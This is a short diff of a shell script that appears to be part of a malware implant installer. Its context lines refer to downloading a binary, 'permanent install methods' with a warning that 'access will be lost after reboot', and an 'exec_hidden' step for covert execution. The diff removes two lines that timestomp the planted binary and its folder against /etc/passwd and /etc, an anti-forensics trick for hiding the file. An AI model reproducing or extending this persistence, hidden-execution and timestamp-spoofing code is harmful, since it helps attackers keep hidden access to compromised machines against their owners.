@@ -236,8 +236,6 @@ download_binary() {
 	
 	# Make executable and fix timestamps
 	chmod +x "$target_path" || return 1
-	touch -r "/etc/passwd" "$target_path" &>"$ERR_LOG"
-	touch -r "/etc" "$(dirname "$target_path")" &>"$ERR_LOG"
 	
 	return 0
 }
@@ -406,6 +404,7 @@ fi
 install ||  print_error "Permanent install methods failed! Access will be lost after reboot."
 
 print_progress "Triggering initial execution"
+
 if exec_hidden; then 
   print_ok 
 else 
